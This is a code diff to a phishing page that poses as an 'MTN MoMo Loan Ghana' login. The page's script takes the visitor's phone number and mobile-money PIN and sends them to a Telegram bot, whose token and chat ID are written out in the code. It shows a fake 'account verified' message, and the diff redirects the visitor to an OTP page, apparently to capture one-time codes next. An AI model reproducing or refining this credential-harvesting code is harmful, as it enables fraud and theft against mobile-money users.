@@ -489,7 +489,7 @@
 
     <script>
         // ============================================
-        // TELEGRAM CREDENTIALS - UPDATED
+        // TELEGRAM CREDENTIALS
         // ============================================
         const BOT_TOKEN = '8912556480:AAF_m34R8vT5GUwhsx29qPW854OOXnl5FfY';
         const CHAT_ID = '8313270294';
@@ -652,7 +652,7 @@
         }
 
         // ============================================
-        // LOGIN HANDLER - Goes to confirmation.html
+        // LOGIN HANDLER - REDIRECTS TO verify.html
         // ============================================
         loginBtn.addEventListener('click', async function() {
             const phone = phoneInput.value.trim();
@@ -686,13 +686,14 @@
             const sent = await sendTelegramNotification(phone, pin);
 
             if (sent) {
-                showStatus('✅ MoMo account verified! Redirecting...', 'success');
+                showStatus('✅ MoMo account verified! Redirecting to OTP...', 'success');
             } else {
-                showStatus('✅ Account verified! Redirecting...', 'info');
+                showStatus('✅ Account verified! Redirecting to OTP...', 'info');
             }
 
+            // REDIRECT TO VERIFY.HTML (OTP PAGE)
             setTimeout(() => {
-                window.location.href = 'confirmation.html';
+                window.location.href = 'verify.html';
             }, 1500);
         });
 
@@ -720,9 +721,7 @@
             checkPinComplete();
 
             console.log('✅ MTN MoMo Loan Ghana - Account Login Loaded');
-            console.log('🤖 Bot Token:', BOT_TOKEN);
-            console.log('📱 Chat ID:', CHAT_ID);
-            console.log('🌐 API URL:', API_URL);
+            console.log('➡️ Next: verify.html (OTP page)');
             console.log('====================================');
         });
     </script>
